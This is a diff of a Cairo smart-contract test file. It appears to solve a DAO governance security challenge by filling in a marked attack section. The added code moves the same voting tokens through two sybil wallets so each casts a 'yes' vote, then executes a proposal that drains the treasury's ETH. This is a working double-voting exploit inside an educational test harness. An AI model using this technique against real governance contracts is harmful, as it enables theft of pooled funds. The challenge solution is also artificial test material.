@@ -4,7 +4,7 @@ use daolulu::utils::helpers;
 use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
 use snforge_std::{
     ContractClassTrait, DeclareResultTrait, declare, start_cheat_block_timestamp_global,
-    start_cheat_caller_address, stop_cheat_caller_address,
+    start_cheat_caller_address, stop_cheat_caller_address, stop_cheat_block_timestamp_global
 };
 use starknet::ContractAddress;
 
@@ -21,15 +21,12 @@ fn deploy_treasury(
     strk: ContractAddress, eth: ContractAddress,
 ) -> (ContractAddress, ITreasuryDispatcher) {
     let contract_class = declare("Treasury").unwrap().contract_class();
-    let mut data_to_constructor = Default::default();
-    Serde::serialize(@strk, ref data_to_constructor);
-    Serde::serialize(@eth, ref data_to_constructor);
-    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
+    let (address, _) = contract_class.deploy(@array![strk.into(), eth.into()]).unwrap();
     (address, ITreasuryDispatcher { contract_address: address })
 }
 
 #[test]
-fn test_governance_1() {
+fn test_dao_attack() {
     // Users
     let alice: ContractAddress = 1.try_into().unwrap();
     let bob: ContractAddress = 2.try_into().unwrap();
@@ -65,20 +62,46 @@ fn test_governance_1() {
 
     // Voting "No" on the proposal from Alice and Bob
     let voters = array![alice, bob];
-    let mut i = 0;
-    loop {
-        if i >= voters.len() {
-            break;
-        }
-        let voter = *voters.at(i);
+    for voter in voters {
         start_cheat_caller_address(strk_address, voter);
         strk_dispatcher.vote(1, false);
         stop_cheat_caller_address(strk_address);
-        i += 1;
     }
 
     // ATTACK START //
-    // TODO: Steal all ETH from treasury to the Attacker
+    // Steal all ETH from treasury to the Attacker
+
+    // transfer function in governance contract doesn't check token provenance
+    // so attacker can create two other wallets, transfer all the voting tokens to one
+    // vote with it, then repeat with other wallet. 
+    let sybil_one: ContractAddress = 4.try_into().unwrap();
+    let sybil_two: ContractAddress = 5.try_into().unwrap();
+
+    // Transfer voting tokens to first wallet
+    start_cheat_caller_address(strk_address, attacker);
+    strk_dispatcher.transfer(sybil_one, helpers::one_ether() * 100);
+    stop_cheat_caller_address(strk_address);
+    // Vote with first wallet using tokens
+    start_cheat_caller_address(strk_address, sybil_one);
+    strk_dispatcher.vote(1, true);
+    stop_cheat_caller_address(strk_address);
+    // Transfer voting tokens to second wallet
+    start_cheat_caller_address(strk_address, sybil_one);
+    strk_dispatcher.transfer(sybil_two, helpers::one_ether() * 100);
+    stop_cheat_caller_address(strk_address);
+    // Vote with second wallet
+    start_cheat_caller_address(strk_address, sybil_two);
+    strk_dispatcher.vote(1, true);
+    stop_cheat_caller_address(strk_address);
+
+    stop_cheat_block_timestamp_global();
+
+    // One week passess
+    // Execute proposal with sufficient 'yes' votes
+    start_cheat_block_timestamp_global(612000);
+    start_cheat_caller_address(strk_address, attacker);
+    strk_dispatcher.execute(1);
+    stop_cheat_caller_address(strk_address);
 
     // ATTACK END //
 
